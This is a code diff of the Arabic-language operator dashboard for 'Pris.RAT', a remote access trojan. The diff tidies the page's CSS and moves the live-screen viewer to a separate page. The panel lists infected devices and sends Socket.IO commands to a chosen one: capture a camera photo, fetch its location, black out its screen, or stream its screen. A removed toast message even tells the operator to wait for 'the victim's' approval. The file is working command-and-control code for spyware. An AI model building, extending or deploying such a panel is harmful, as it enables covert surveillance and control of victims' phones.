@@ -6,551 +6,84 @@
 <title>Pris.RAT — لوحة التحكم</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Tahoma', sans-serif; }
-
-body {
-  background: #0a0a0f;
-  color: #fff;
-  min-height: 100vh;
-  background-image:
-    radial-gradient(circle at 10% 20%, rgba(255,0,51,0.08) 0%, transparent 40%),
-    radial-gradient(circle at 90% 80%, rgba(0,100,255,0.05) 0%, transparent 40%);
-}
-
-/* ========== Layout ========== */
-.layout {
-  display: flex;
-  min-height: 100vh;
-}
-
-/* ========== Sidebar ========== */
-.sidebar {
-  width: 240px;
-  background: linear-gradient(180deg, rgba(15,5,15,0.98), rgba(10,10,20,0.98));
-  border-left: 2px solid #ff0033;
-  padding: 20px 0;
-  position: fixed;
-  top: 0;
-  right: 0;
-  bottom: 0;
-  z-index: 100;
-  display: flex;
-  flex-direction: column;
-  box-shadow: -5px 0 30px rgba(255,0,51,0.2);
-}
-
-.sidebar-logo {
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  padding: 0 20px 20px;
-  border-bottom: 1px solid #222;
-  margin-bottom: 15px;
-}
-
-.sidebar-logo-icon {
-  width: 45px;
-  height: 45px;
-  background: radial-gradient(circle, rgba(255,0,51,0.3), rgba(100,0,20,0.8));
-  border: 2px solid #ff0033;
-  border-radius: 50%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 24px;
-  box-shadow: 0 0 15px rgba(255,0,51,0.6);
-}
-
-.sidebar-logo-text h2 {
-  font-size: 18px;
-  letter-spacing: 2px;
-}
+body { background: #0a0a0f; color: #fff; min-height: 100vh; background-image: radial-gradient(circle at 10% 20%, rgba(255,0,51,0.08) 0%, transparent 40%), radial-gradient(circle at 90% 80%, rgba(0,100,255,0.05) 0%, transparent 40%); }
+.layout { display: flex; min-height: 100vh; }
+.sidebar { width: 240px; background: linear-gradient(180deg, rgba(15,5,15,0.98), rgba(10,10,20,0.98)); border-left: 2px solid #ff0033; padding: 20px 0; position: fixed; top: 0; right: 0; bottom: 0; z-index: 100; display: flex; flex-direction: column; box-shadow: -5px 0 30px rgba(255,0,51,0.2); }
+.sidebar-logo { display: flex; align-items: center; gap: 12px; padding: 0 20px 20px; border-bottom: 1px solid #222; margin-bottom: 15px; }
+.sidebar-logo-icon { width: 45px; height: 45px; background: radial-gradient(circle, rgba(255,0,51,0.3), rgba(100,0,20,0.8)); border: 2px solid #ff0033; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; box-shadow: 0 0 15px rgba(255,0,51,0.6); }
+.sidebar-logo-text h2 { font-size: 18px; letter-spacing: 2px; }
 .sidebar-logo-text h2 span { color: #ff0033; }
-.sidebar-logo-text p {
-  font-size: 9px;
-  color: #666;
-  letter-spacing: 2px;
-}
-
-.sidebar-nav {
-  flex: 1;
-  padding: 0 10px;
-}
-
-.nav-item {
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  padding: 12px 15px;
-  color: #888;
-  text-decoration: none;
-  border-radius: 10px;
-  margin-bottom: 5px;
-  font-size: 14px;
-  transition: all 0.3s;
-  cursor: pointer;
-  border: 1px solid transparent;
-}
-
-.nav-item:hover {
-  background: rgba(255,0,51,0.1);
-  color: #fff;
-}
-
-.nav-item.active {
-  background: linear-gradient(90deg, rgba(255,0,51,0.2), rgba(255,0,51,0.05));
-  color: #fff;
-  border-color: #ff0033;
-  box-shadow: 0 0 15px rgba(255,0,51,0.3);
-}
-
-.nav-item .ico {
-  font-size: 20px;
-  width: 24px;
-  text-align: center;
-}
-
-.nav-item .badge {
-  margin-right: auto;
-  background: #ff0033;
-  color: #fff;
-  padding: 2px 8px;
-  border-radius: 10px;
-  font-size: 10px;
-  font-weight: bold;
-}
-
-.sidebar-footer {
-  padding: 15px 20px;
-  border-top: 1px solid #222;
-  font-size: 10px;
-  color: #444;
-  text-align: center;
-  letter-spacing: 1px;
-}
-
-/* ========== Main Content ========== */
-.main-content {
-  flex: 1;
-  margin-right: 240px;
-  padding: 20px;
-}
-
-/* ========== Header ========== */
-.header {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 15px 20px;
-  background: linear-gradient(90deg, rgba(20,0,10,0.95), rgba(10,10,20,0.95));
-  border: 2px solid #ff0033;
-  border-radius: 12px;
-  margin-bottom: 20px;
-  box-shadow: 0 0 25px rgba(255,0,51,0.2);
-  flex-wrap: wrap;
-  gap: 10px;
-}
-
-.header-title {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  font-size: 18px;
-  font-weight: bold;
-}
-
-.header-right {
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  flex-wrap: wrap;
-}
-
-.status-pill {
-  display: flex;
-  align-items: center;
-  gap: 6px;
-  background: rgba(0,255,0,0.08);
-  border: 1px solid #0f0;
-  padding: 6px 14px;
-  border-radius: 20px;
-  color: #0f0;
-  font-size: 12px;
-}
-
-.dot {
-  width: 8px;
-  height: 8px;
-  border-radius: 50%;
-  background: #0f0;
-  box-shadow: 0 0 10px #0f0;
-  animation: pulse 2s infinite;
-}
+.sidebar-logo-text p { font-size: 9px; color: #666; letter-spacing: 2px; }
+.sidebar-nav { flex: 1; padding: 0 10px; }
+.nav-item { display: flex; align-items: center; gap: 12px; padding: 12px 15px; color: #888; text-decoration: none; border-radius: 10px; margin-bottom: 5px; font-size: 14px; transition: all 0.3s; cursor: pointer; border: 1px solid transparent; }
+.nav-item:hover { background: rgba(255,0,51,0.1); color: #fff; }
+.nav-item.active { background: linear-gradient(90deg, rgba(255,0,51,0.2), rgba(255,0,51,0.05)); color: #fff; border-color: #ff0033; box-shadow: 0 0 15px rgba(255,0,51,0.3); }
+.nav-item .ico { font-size: 20px; width: 24px; text-align: center; }
+.nav-item .badge { margin-right: auto; background: #ff0033; color: #fff; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: bold; }
+.sidebar-footer { padding: 15px 20px; border-top: 1px solid #222; font-size: 10px; color: #444; text-align: center; letter-spacing: 1px; }
+.main-content { flex: 1; margin-right: 240px; padding: 20px; }
+.header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background: linear-gradient(90deg, rgba(20,0,10,0.95), rgba(10,10,20,0.95)); border: 2px solid #ff0033; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 0 25px rgba(255,0,51,0.2); flex-wrap: wrap; gap: 10px; }
+.header-title { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: bold; }
+.header-right { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+.status-pill { display: flex; align-items: center; gap: 6px; background: rgba(0,255,0,0.08); border: 1px solid #0f0; padding: 6px 14px; border-radius: 20px; color: #0f0; font-size: 12px; }
+.dot { width: 8px; height: 8px; border-radius: 50%; background: #0f0; box-shadow: 0 0 10px #0f0; animation: pulse 2s infinite; }
 @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-
-.time-pill {
-  background: rgba(255,255,255,0.05);
-  border: 1px solid #333;
-  padding: 6px 14px;
-  border-radius: 20px;
-  font-size: 12px;
-  color: #aaa;
-}
-
-.user-pill {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  background: rgba(255,0,51,0.1);
-  border: 1px solid #ff0033;
-  padding: 6px 14px;
-  border-radius: 20px;
-  font-size: 12px;
-}
-
-.logout-btn {
-  background: linear-gradient(135deg, #ff0033, #990000);
-  color: #fff;
-  border: none;
-  padding: 8px 18px;
-  border-radius: 8px;
-  text-decoration: none;
-  font-size: 13px;
-  font-weight: bold;
-  cursor: pointer;
-  transition: all 0.3s;
-}
+.time-pill { background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 6px 14px; border-radius: 20px; font-size: 12px; color: #aaa; }
+.user-pill { display: flex; align-items: center; gap: 8px; background: rgba(255,0,51,0.1); border: 1px solid #ff0033; padding: 6px 14px; border-radius: 20px; font-size: 12px; }
+.logout-btn { background: linear-gradient(135deg, #ff0033, #990000); color: #fff; border: none; padding: 8px 18px; border-radius: 8px; text-decoration: none; font-size: 13px; font-weight: bold; cursor: pointer; transition: all 0.3s; }
 .logout-btn:hover { box-shadow: 0 0 20px rgba(255,0,51,0.8); }
-
-/* ========== Stats ========== */
-.stats {
-  display: grid;
-  grid-template-columns: repeat(3, 1fr);
-  gap: 15px;
-  margin-bottom: 20px;
-}
-
-.stat-card {
-  background: linear-gradient(135deg, rgba(20,20,30,0.98), rgba(30,10,20,0.98));
-  border: 2px solid #333;
-  border-radius: 12px;
-  padding: 20px;
-  position: relative;
-  overflow: hidden;
-  transition: all 0.3s;
-}
-
-.stat-card::before {
-  content: '';
-  position: absolute;
-  top: 0;
-  right: 0;
-  width: 4px;
-  height: 100%;
-  background: #ff0033;
-  box-shadow: 0 0 15px #ff0033;
-}
+.stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
+.stat-card { background: linear-gradient(135deg, rgba(20,20,30,0.98), rgba(30,10,20,0.98)); border: 2px solid #333; border-radius: 12px; padding: 20px; position: relative; overflow: hidden; transition: all 0.3s; }
+.stat-card::before { content: ''; position: absolute; top: 0; right: 0; width: 4px; height: 100%; background: #ff0033; box-shadow: 0 0 15px #ff0033; }
 .stat-card.green::before { background: #0f0; box-shadow: 0 0 15px #0f0; }
 .stat-card.red::before { background: #f00; box-shadow: 0 0 15px #f00; }
-
-.stat-card:hover {
-  border-color: #ff0033;
-  transform: translateY(-3px);
-  box-shadow: 0 10px 30px rgba(255,0,51,0.2);
-}
-
-.stat-header {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 10px;
-}
-
-.stat-icon {
-  width: 45px;
-  height: 45px;
-  background: rgba(255,0,51,0.1);
-  border-radius: 10px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 22px;
-}
+.stat-card:hover { border-color: #ff0033; transform: translateY(-3px); box-shadow: 0 10px 30px rgba(255,0,51,0.2); }
+.stat-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+.stat-icon { width: 45px; height: 45px; background: rgba(255,0,51,0.1); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 22px; }
 .stat-card.green .stat-icon { background: rgba(0,255,0,0.1); }
 .stat-card.red .stat-icon { background: rgba(255,0,0,0.1); }
-
-.stat-num {
-  font-size: 36px;
-  font-weight: bold;
-  color: #ff0033;
-  text-shadow: 0 0 15px rgba(255,0,51,0.7);
-}
+.stat-num { font-size: 36px; font-weight: bold; color: #ff0033; text-shadow: 0 0 15px rgba(255,0,51,0.7); }
 .stat-card.green .stat-num { color: #0f0; text-shadow: 0 0 15px rgba(0,255,0,0.7); }
 .stat-card.red .stat-num { color: #f00; text-shadow: 0 0 15px rgba(255,0,0,0.7); }
-
-.stat-label {
-  color: #888;
-  font-size: 12px;
-  letter-spacing: 1px;
-}
-
-/* ========== Section ========== */
-.section-title {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  font-size: 16px;
-  margin: 20px 0 12px;
-  padding: 10px 15px;
-  background: linear-gradient(90deg, rgba(255,0,51,0.15), transparent);
-  border-right: 4px solid #ff0033;
-  border-radius: 8px;
-}
-.section-title .count {
-  background: #ff0033;
-  color: #fff;
-  padding: 2px 10px;
-  border-radius: 10px;
-  font-size: 12px;
-  margin-right: auto;
-}
-
-/* ========== Device List ========== */
-.device-list {
-  display: flex;
-  flex-direction: column;
-  gap: 10px;
-}
-
-.device-card {
-  background: linear-gradient(135deg, rgba(20,20,30,0.98), rgba(15,15,25,0.98));
-  border: 2px solid #333;
-  border-radius: 12px;
-  padding: 15px 20px;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  transition: all 0.3s;
-  cursor: pointer;
-  position: relative;
-  gap: 15px;
-}
-
-.device-card:hover {
-  border-color: #ff0033;
-  transform: translateX(-5px);
-  box-shadow: 0 0 25px rgba(255,0,51,0.3);
-}
-
-.device-card.selected {
-  border-color: #0f0;
-  box-shadow: 0 0 25px rgba(0,255,0,0.4);
-}
-
+.stat-label { color: #888; font-size: 12px; letter-spacing: 1px; }
+.section-title { display: flex; align-items: center; gap: 10px; font-size: 16px; margin: 20px 0 12px; padding: 10px 15px; background: linear-gradient(90deg, rgba(255,0,51,0.15), transparent); border-right: 4px solid #ff0033; border-radius: 8px; }
+.section-title .count { background: #ff0033; color: #fff; padding: 2px 10px; border-radius: 10px; font-size: 12px; margin-right: auto; }
+.device-list { display: flex; flex-direction: column; gap: 10px; }
+.device-card { background: linear-gradient(135deg, rgba(20,20,30,0.98), rgba(15,15,25,0.98)); border: 2px solid #333; border-radius: 12px; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; transition: all 0.3s; cursor: pointer; gap: 15px; }
+.device-card:hover { border-color: #ff0033; transform: translateX(-5px); box-shadow: 0 0 25px rgba(255,0,51,0.3); }
+.device-card.selected { border-color: #0f0; box-shadow: 0 0 25px rgba(0,255,0,0.4); }
 .device-card.online { border-right: 4px solid #0f0; }
 .device-card.offline { border-right: 4px solid #f00; opacity: 0.55; }
-
-.device-left {
-  display: flex;
-  align-items: center;
-  gap: 15px;
-  flex: 1;
-  min-width: 0;
-}
-
-.device-icon-box {
-  width: 50px;
-  height: 50px;
-  background: linear-gradient(135deg, rgba(255,0,51,0.15), rgba(100,0,20,0.15));
-  border: 2px solid #ff0033;
-  border-radius: 12px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 24px;
-  flex-shrink: 0;
-  box-shadow: 0 0 10px rgba(255,0,51,0.3);
-}
-.device-card.online .device-icon-box {
-  border-color: #0f0;
-  box-shadow: 0 0 10px rgba(0,255,0,0.3);
-}
-
-.device-info {
-  flex: 1;
-  min-width: 0;
-}
-
-.device-name {
-  font-size: 15px;
-  color: #fff;
-  font-weight: bold;
-  white-space: nowrap;
-  overflow: hidden;
-  text-overflow: ellipsis;
-}
-
-.device-meta {
-  font-size: 11px;
-  color: #888;
-  margin-top: 6px;
-  display: flex;
-  gap: 12px;
-  flex-wrap: wrap;
-}
-
-.device-meta span {
-  display: flex;
-  align-items: center;
-  gap: 4px;
-  white-space: nowrap;
-}
-
-.status-badge-dev {
-  padding: 6px 14px;
-  border-radius: 15px;
-  font-size: 11px;
-  font-weight: bold;
-  flex-shrink: 0;
-}
-.status-online {
-  background: rgba(0,255,0,0.15);
-  color: #0f0;
-  border: 1px solid #0f0;
-}
-.status-offline {
-  background: rgba(255,0,0,0.15);
-  color: #f00;
-  border: 1px solid #f00;
-}
-
-/* ========== Empty ========== */
-.empty {
-  text-align: center;
-  padding: 60px 20px;
-  color: #666;
-  font-size: 15px;
-  background: rgba(20,20,25,0.5);
-  border-radius: 12px;
-  border: 2px dashed #333;
-}
+.device-left { display: flex; align-items: center; gap: 15px; flex: 1; min-width: 0; }
+.device-icon-box { width: 50px; height: 50px; background: linear-gradient(135deg, rgba(255,0,51,0.15), rgba(100,0,20,0.15)); border: 2px solid #ff0033; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 24px; flex-shrink: 0; box-shadow: 0 0 10px rgba(255,0,51,0.3); }
+.device-card.online .device-icon-box { border-color: #0f0; box-shadow: 0 0 10px rgba(0,255,0,0.3); }
+.device-info { flex: 1; min-width: 0; }
+.device-name { font-size: 15px; color: #fff; font-weight: bold; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.device-meta { font-size: 11px; color: #888; margin-top: 6px; display: flex; gap: 12px; flex-wrap: wrap; }
+.device-meta span { display: flex; align-items: center; gap: 4px; white-space: nowrap; }
+.status-badge-dev { padding: 6px 14px; border-radius: 15px; font-size: 11px; font-weight: bold; flex-shrink: 0; }
+.status-online { background: rgba(0,255,0,0.15); color: #0f0; border: 1px solid #0f0; }
+.status-offline { background: rgba(255,0,0,0.15); color: #f00; border: 1px solid #f00; }
+.empty { text-align: center; padding: 60px 20px; color: #666; font-size: 15px; background: rgba(20,20,25,0.5); border-radius: 12px; border: 2px dashed #333; }
 .empty .big { font-size: 70px; margin-bottom: 15px; opacity: 0.4; }
-
-/* ========== Controls ========== */
-.controls {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-  gap: 12px;
-  margin-top: 15px;
-}
-
-.ctrl-btn {
-  background: linear-gradient(135deg, rgba(255,0,51,0.12), rgba(153,0,0,0.12));
-  border: 2px solid #ff0033;
-  border-radius: 12px;
-  padding: 20px 15px;
-  color: #fff;
-  font-size: 13px;
-  font-weight: bold;
-  cursor: pointer;
-  transition: all 0.3s;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  gap: 10px;
-  box-shadow: 0 0 15px rgba(255,0,51,0.15);
-  position: relative;
-  overflow: hidden;
-  font-family: inherit;
-  text-align: center;
-}
-
-.ctrl-btn::before {
-  content: '';
-  position: absolute;
-  top: -50%;
-  left: -50%;
-  width: 200%;
-  height: 200%;
-  background: radial-gradient(circle, rgba(255,0,51,0.3) 0%, transparent 70%);
-  opacity: 0;
-  transition: opacity 0.3s;
-}
-
-.ctrl-btn:hover::before { opacity: 1; }
-
-.ctrl-btn:hover {
-  background: linear-gradient(135deg, rgba(255,0,51,0.4), rgba(153,0,0,0.4));
-  box-shadow: 0 0 30px rgba(255,0,51,0.7);
-  transform: translateY(-3px);
-}
-
+.controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-top: 15px; }
+.ctrl-btn { background: linear-gradient(135deg, rgba(255,0,51,0.12), rgba(153,0,0,0.12)); border: 2px solid #ff0033; border-radius: 12px; padding: 20px 15px; color: #fff; font-size: 13px; font-weight: bold; cursor: pointer; transition: all 0.3s; display: flex; flex-direction: column; align-items: center; gap: 10px; box-shadow: 0 0 15px rgba(255,0,51,0.15); font-family: inherit; text-align: center; }
+.ctrl-btn:hover { background: linear-gradient(135deg, rgba(255,0,51,0.4), rgba(153,0,0,0.4)); box-shadow: 0 0 30px rgba(255,0,51,0.7); transform: translateY(-3px); }
 .ctrl-btn:active { transform: translateY(0) scale(0.95); }
-
-.ctrl-btn .ico {
-  font-size: 32px;
-  filter: drop-shadow(0 0 8px rgba(255,0,51,0.8));
-}
-
-.ctrl-btn.red {
-  background: linear-gradient(135deg, rgba(255,0,0,0.25), rgba(100,0,0,0.25));
-}
-.ctrl-btn.green {
-  background: linear-gradient(135deg, rgba(0,255,0,0.15), rgba(0,100,0,0.15));
-  border-color: #0f0;
-}
-.ctrl-btn.green .ico {
-  filter: drop-shadow(0 0 8px rgba(0,255,0,0.8));
-}
-.ctrl-btn.blue {
-  background: linear-gradient(135deg, rgba(0,150,255,0.15), rgba(0,50,150,0.15));
-  border-color: #0099ff;
-}
-.ctrl-btn.blue .ico {
-  filter: drop-shadow(0 0 8px rgba(0,150,255,0.8));
-}
-
-/* ========== Toast ========== */
-.toast {
-  position: fixed;
-  top: 20px;
-  left: 20px;
-  padding: 15px 25px;
-  border-radius: 10px;
-  font-weight: bold;
-  z-index: 10001;
-  font-size: 13px;
-  animation: slideIn 0.3s;
-  box-shadow: 0 5px 25px rgba(0,0,0,0.6);
-  border: 2px solid;
-  max-width: 300px;
-}
+.ctrl-btn .ico { font-size: 32px; filter: drop-shadow(0 0 8px rgba(255,0,51,0.8)); }
+.ctrl-btn.red { background: linear-gradient(135deg, rgba(255,0,0,0.25), rgba(100,0,0,0.25)); }
+.ctrl-btn.green { background: linear-gradient(135deg, rgba(0,255,0,0.15), rgba(0,100,0,0.15)); border-color: #0f0; }
+.ctrl-btn.green .ico { filter: drop-shadow(0 0 8px rgba(0,255,0,0.8)); }
+.ctrl-btn.blue { background: linear-gradient(135deg, rgba(0,150,255,0.15), rgba(0,50,150,0.15)); border-color: #0099ff; }
+.ctrl-btn.blue .ico { filter: drop-shadow(0 0 8px rgba(0,150,255,0.8)); }
+.toast { position: fixed; top: 20px; left: 20px; padding: 15px 25px; border-radius: 10px; font-weight: bold; z-index: 10001; font-size: 13px; animation: slideIn 0.3s; box-shadow: 0 5px 25px rgba(0,0,0,0.6); border: 2px solid; max-width: 300px; }
 .toast.success { background: rgba(0,255,0,0.15); color: #0f0; border-color: #0f0; }
 .toast.error { background: rgba(255,0,0,0.15); color: #f00; border-color: #f00; }
 .toast.info { background: rgba(255,0,51,0.15); color: #ff0033; border-color: #ff0033; }
-
-@keyframes slideIn {
-  from { transform: translateX(-100px); opacity: 0; }
-  to { transform: translateX(0); opacity: 1; }
-}
-
-/* ========== Mobile ========== */
-.menu-toggle {
-  display: none;
-  background: rgba(255,0,51,0.2);
-  border: 2px solid #ff0033;
-  color: #fff;
-  width: 40px;
-  height: 40px;
-  border-radius: 8px;
-  font-size: 20px;
-  cursor: pointer;
-}
-
+@keyframes slideIn { from { transform: translateX(-100px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+.menu-toggle { display: none; background: rgba(255,0,51,0.2); border: 2px solid #ff0033; color: #fff; width: 40px; height: 40px; border-radius: 8px; font-size: 20px; cursor: pointer; }
 @media (max-width: 900px) {
-  .sidebar {
-    transform: translateX(100%);
-    transition: transform 0.3s;
-  }
+  .sidebar { transform: translateX(100%); transition: transform 0.3s; }
   .sidebar.open { transform: translateX(0); }
   .main-content { margin-right: 0; padding: 10px; }
   .menu-toggle { display: flex; align-items: center; justify-content: center; }
@@ -569,8 +102,6 @@ body {
 <body>
 
 <div class="layout">
-
-  <!-- Sidebar -->
   <aside class="sidebar" id="sidebar">
     <div class="sidebar-logo">
       <div class="sidebar-logo-icon">🐺</div>
@@ -579,86 +110,57 @@ body {
         <p>CONTROL · MANAGE</p>
       </div>
     </div>
-
     <nav class="sidebar-nav">
       <a class="nav-item active" onclick="showSection('devices')">
-        <span class="ico">📱</span>
-        <span>الأجهزة</span>
+        <span class="ico">📱</span><span>الأجهزة</span>
         <span class="badge">{{ total }}</span>
       </a>
       <a class="nav-item" onclick="cmdAndToast('camera','📷')">
-        <span class="ico">📷</span>
-        <span>الكاميرا</span>
+        <span class="ico">📷</span><span>الكاميرا</span>
       </a>
       <a class="nav-item" onclick="cmdAndToast('location','📍')">
-        <span class="ico">📍</span>
-        <span>الموقع</span>
+        <span class="ico">📍</span><span>الموقع</span>
       </a>
       <a class="nav-item" onclick="cmdAndToast('blackout','⬛')">
-        <span class="ico">⬛</span>
-        <span>الشاشة السوداء</span>
+        <span class="ico">⬛</span><span>الشاشة السوداء</span>
       </a>
     </nav>
-
-    <div class="sidebar-footer">
-      Powered by Pris.RAT © 2026
-    </div>
+    <div class="sidebar-footer">Powered by Pris.RAT © 2026</div>
   </aside>
 
-  <!-- Main Content -->
   <main class="main-content">
-
-    <!-- Header -->
     <div class="header">
       <button class="menu-toggle" onclick="toggleMenu()">☰</button>
       <div class="header-title">📊 لوحة التحكم</div>
       <div class="header-right">
-        <div class="status-pill">
-          <div class="dot"></div>
-          <span>السيرفر متصل</span>
-        </div>
+        <div class="status-pill"><div class="dot"></div><span>السيرفر متصل</span></div>
         <div class="time-pill" id="clock">--:--</div>
         <div class="user-pill">👤 {{ session_user or 'Admin' }}</div>
         <a href="/logout" class="logout-btn">خروج</a>
       </div>
     </div>
 
-    <!-- Stats -->
     <div class="stats">
       <div class="stat-card">
-        <div class="stat-header">
-          <div class="stat-icon">📱</div>
-          <div class="stat-num">{{ total }}</div>
-        </div>
+        <div class="stat-header"><div class="stat-icon">📱</div><div class="stat-num">{{ total }}</div></div>
         <div class="stat-label">إجمالي الأجهزة</div>
       </div>
       <div class="stat-card green">
-        <div class="stat-header">
-          <div class="stat-icon">🟢</div>
-          <div class="stat-num">{{ online }}</div>
-        </div>
+        <div class="stat-header"><div class="stat-icon">🟢</div><div class="stat-num">{{ online }}</div></div>
         <div class="stat-label">متصل</div>
       </div>
       <div class="stat-card red">
-        <div class="stat-header">
-          <div class="stat-icon">🔴</div>
-          <div class="stat-num">{{ offline }}</div>
-        </div>
+        <div class="stat-header"><div class="stat-icon">🔴</div><div class="stat-num">{{ offline }}</div></div>
         <div class="stat-label">غير متصل</div>
       </div>
     </div>
 
-    <!-- Devices -->
-    <div class="section-title">
-      📱 <span>الأجهزة المتصلة</span>
-      <span class="count">{{ total }}</span>
-    </div>
+    <div class="section-title">📱 <span>الأجهزة المتصلة</span><span class="count">{{ total }}</span></div>
 
     <div class="device-list">
       {% if devices %}
         {% for d in devices %}
-        <div class="device-card {% if d.online %}online{% else %}offline{% endif %}"
-             onclick="selectDevice('{{ d.id }}', this)">
+        <div class="device-card {% if d.online %}online{% else %}offline{% endif %}" onclick="selectDevice('{{ d.id }}', this)">
           <div class="device-left">
             <div class="device-icon-box">📱</div>
             <div class="device-info">
@@ -684,65 +186,28 @@ body {
       {% endif %}
     </div>
 
-    <!-- Controls -->
-    <div class="section-title">
-      ⚡ <span>التحكم السريع</span>
-    </div>
+    <div class="section-title">⚡ <span>التحكم السريع</span></div>
 
     <div class="controls">
-      <div class="ctrl-btn blue" onclick="startScreen()">
-        <span class="ico">📺</span>
-        <span>لايف سكرين</span>
-      </div>
-      <div class="ctrl-btn" onclick="cmd('camera')">
-        <span class="ico">📷</span>
-        <span>كاميرا</span>
-      </div>
-      <div class="ctrl-btn blue" onclick="cmd('location')">
-        <span class="ico">📍</span>
-        <span>موقع</span>
-      </div>
-      <div class="ctrl-btn red" onclick="cmd('blackout')">
-        <span class="ico">⬛</span>
-        <span>شاشة سوداء</span>
-      </div>
-      <div class="ctrl-btn green" onclick="cmd('unblackout')">
-        <span class="ico">🔆</span>
-        <span>رجّع الشاشة</span>
-      </div>
-      <div class="ctrl-btn red" onclick="cmd('stop_screen')">
-        <span class="ico">🛑</span>
-        <span>إيقاف اللايف</span>
-      </div>
+      <div class="ctrl-btn blue" onclick="startScreen()"><span class="ico">📺</span><span>لايف سكرين</span></div>
+      <div class="ctrl-btn" onclick="cmd('camera')"><span class="ico">📷</span><span>كاميرا</span></div>
+      <div class="ctrl-btn blue" onclick="cmd('location')"><span class="ico">📍</span><span>موقع</span></div>
+      <div class="ctrl-btn red" onclick="cmd('blackout')"><span class="ico">⬛</span><span>شاشة سوداء</span></div>
+      <div class="ctrl-btn green" onclick="cmd('unblackout')"><span class="ico">🔆</span><span>رجّع الشاشة</span></div>
+      <div class="ctrl-btn red" onclick="cmd('stop_screen')"><span class="ico">🛑</span><span>إيقاف اللايف</span></div>
     </div>
-
   </main>
-</div>
-
-<!-- Screen Viewer -->
-<div id="screenView" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#000;z-index:9999;flex-direction:column;">
-  <div style="padding:12px 20px;background:linear-gradient(90deg,rgba(255,0,51,0.2),rgba(0,0,0,0.9));display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #ff0033;">
-    <div style="display:flex;align-items:center;gap:10px;font-weight:bold;">📺 لايف سكرين — اضغط على الشاشة للتحكم</div>
-    <button onclick="closeScreen()" style="background:linear-gradient(135deg,#ff0033,#990000);color:#fff;border:none;padding:10px 20px;border-radius:8px;font-weight:bold;cursor:pointer;">✖ إغلاق</button>
-  </div>
-  <div id="screenWrapper" style="flex:1;display:flex;align-items:center;justify-content:center;overflow:hidden;">
-    <img id="screenImg" src="" style="max-width:100%;max-height:100%;object-fit:contain;cursor:crosshair;">
-  </div>
 </div>
 
 <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 <script>
 let selectedDevice = null;
-let screenActive = false;
 const socket = io();
 
-// الساعة
 function updateClock() {
   const now = new Date();
-  const h = String(now.getHours()).padStart(2,'0');
-  const m = String(now.getMinutes()).padStart(2,'0');
   const el = document.getElementById('clock');
-  if (el) el.textContent = h + ':' + m;
+  if (el) el.textContent = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0');
 }
 setInterval(updateClock, 1000);
 updateClock();
@@ -750,25 +215,14 @@ updateClock();
 socket.on('devices_update', () => setTimeout(() => location.reload(), 1500));
 
 socket.on('device_response', (data) => {
-  if (data.type === 'screen' && data.image) {
-    const img = document.getElementById('screenImg');
-    if (img) img.src = 'data:image/jpeg;base64,' + data.image;
-  }
-  if (data.type === 'camera' && data.image) {
-    showImage('data:image/jpeg;base64,' + data.image);
-  }
+  if (data.type === 'camera' && data.image) showImage('data:image/jpeg;base64,' + data.image);
   if (data.type === 'location') {
-    if (data.lat && (data.lat !== 0 || data.lon !== 0)) {
-      showToast('📍 ' + data.lat.toFixed(4) + ', ' + data.lon.toFixed(4), 'success');
-    } else {
-      showToast('❌ الموقع مش متاح', 'error');
-    }
+    if (data.lat && (data.lat !== 0 || data.lon !== 0)) showToast('📍 ' + data.lat.toFixed(4) + ', ' + data.lon.toFixed(4), 'success');
+    else showToast('❌ الموقع مش متاح', 'error');
   }
 });
 
-function toggleMenu() {
-  document.getElementById('sidebar').classList.toggle('open');
-}
+function toggleMenu() { document.getElementById('sidebar').classList.toggle('open'); }
 
 function selectDevice(id, el) {
   selectedDevice = id;
@@ -779,16 +233,8 @@ function selectDevice(id, el) {
 
 function startScreen() {
   if (!selectedDevice) { showToast('⚠️ اختر جهاز أولاً', 'error'); return; }
-  socket.emit('send_command', { target: selectedDevice, action: 'request_screen' });
-  screenActive = true;
-  document.getElementById('screenView').style.display = 'flex';
-  showToast('📺 انتظر موافقة الضحية', 'info');
-}
-
-function closeScreen() {
-  screenActive = false;
-  document.getElementById('screenView').style.display = 'none';
-  if (selectedDevice) socket.emit('send_command', { target: selectedDevice, action: 'stop_screen' });
+  try { sessionStorage.setItem('selectedDevice', selectedDevice); } catch(e) {}
+  window.location.href = '/screen';
 }
 
 function cmd(action) {
@@ -800,31 +246,12 @@ function cmd(action) {
 function cmdAndToast(action, icon) {
   if (!selectedDevice) { showToast('⚠️ اختر جهاز أولاً', 'error'); return; }
   socket.emit('send_command', { target: selectedDevice, action: action });
